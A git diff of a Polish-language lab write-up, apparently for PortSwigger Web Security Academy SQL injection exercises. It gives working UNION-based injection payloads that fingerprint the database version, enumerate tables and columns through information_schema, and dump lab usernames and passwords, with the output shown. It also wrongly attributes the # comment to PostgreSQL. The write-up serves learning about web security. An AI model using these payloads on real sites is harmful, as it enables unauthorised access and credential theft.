@@ -33,3 +33,32 @@ Kolejnym krokiem było zidentyfikowane, która kolumna zawiera tekt, ponownie ob
 Następnie jeśli już wiemy wszystko wystarczy odgadnąć która baza danych działa na serwerze. Udało mi się dowiedzieć za pomocą tego zapytania:
 ``` ' UNION SELECT @@version, NULL# ```
 Odkryłem również, że działa to ``` ' UNION SELECT version(), NULL# ``` co wydawało mi się bardziej logiczne, ponieważ komentarz # pochodzi od PostgreSQL
+
+Laboratorium: Zaatakowanie wtrysku SQL, wymienianie zawartości bazy danych w bazach danych innych niż Oregon
+Pierwszym krokiem było określenie liczby kolumn w przechwyconym pakiecie
+``` ' UNION SELECT NULL,NULL-- ```
+Dowiedziałem się, że są dwie. Kolejnym krokiem było zidentyfikowane, która kolumna zawiera tekt, ponownie oby dwie zawierały tekst:
+``` ' UNION SELECT 'qwe','qwe'-- ```
+Następnie jeśli już wiemy wszystko co jest nam potrzebne musimy zrzucić wszystkie nazwy baz danych.
+``` ' UNION SELECT table_name, NULL FROM information_schema.tables-- ```
+Ujrzałem ciekawą i zarazem nietypową baze danych. ```users_ulaacr```
+Następnie musimy zobaczyć jakie kolumny znajdują się w tej bazie danych.
+``` ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ulaacr'-- ```
+Dzięki temu dowiedzieliśmy się o dwóch ciekawych kolumnach.
+```
+username_yiyraf
+password_sgsccz
+```
+Następnie musimy wyodrebnić z nich nazwy użytkowników i hasła:
+``` ' UNION SELECT username_yiyraf,password_sgsccz FROM users_ulaacr-- ```
+Dzięki temu uzyskaliśmy zrzut haseł i nazw użytkoników
+```
+<b1>
+carlos
+	cj1w2piec8pdfjtp2a76
+wiener
+	vib0xw0oz6v4y98074s0
+administrator
+	qo33srs73uxgafa3f08o
+</b1>
+```
